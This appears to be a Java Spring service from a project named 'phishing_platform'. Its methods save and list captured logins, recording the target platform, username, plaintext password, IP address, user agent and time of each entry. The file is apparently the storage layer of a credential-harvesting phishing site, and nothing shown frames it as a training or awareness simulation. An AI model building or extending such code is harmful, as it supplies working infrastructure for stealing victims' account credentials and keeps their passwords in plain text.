package com.example.phishing_platform.service;


import com.example.phishing_platform.model.LogPhishing;
import com.example.phishing_platform.repository.LogPhishingRepository;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import java.time.LocalDateTime;
import java.util.List;

@Service
public class LogPhishingService {

    @Autowired
    private LogPhishingRepository repo;

    public void registrar(String plataforma, String username, String password, String ip, String userAgent) {
        LogPhishing log = new LogPhishing();
        log.setPlataforma(plataforma);
        log.setUsername(username);
        log.setPassword(password);
        log.setIp(ip);
        log.setUserAgent(userAgent);
        log.setDataHora(LocalDateTime.now());
        repo.save(log);
    }

    public List<LogPhishing> listar() {
        return repo.findAll();
    }
}

